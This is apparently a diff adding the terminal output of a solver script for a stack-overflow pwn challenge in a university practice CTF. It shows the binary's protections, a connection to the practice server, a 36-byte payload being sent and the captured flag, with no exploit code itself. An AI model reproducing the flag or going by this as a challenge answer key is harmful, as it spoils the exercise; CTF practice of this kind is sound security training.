@@ -1,0 +1,18 @@
+┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Digital Security Lab CTF/Pwn/Overflowing River]
+└─$ python3 solver.py
+[*] '/home/wanzkey/Digital Security Lab CTF/Pwn/Overflowing River/chall'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+[+] Opening connection to practice-digitalsecuritylab.di.unipi.it on port 10001: Done
+[*] Payload length: 36
+[*] Switching to interactive mode
+Wait, how did you do it?
+flag{n0thing_b3tter_th4n_sm4shing_the_st5ck!}
+[*] Got EOF while reading in interactive
+$
+[*] Interrupted
+[*] Closed connection to practice-digitalsecuritylab.di.unipi.it port 10001
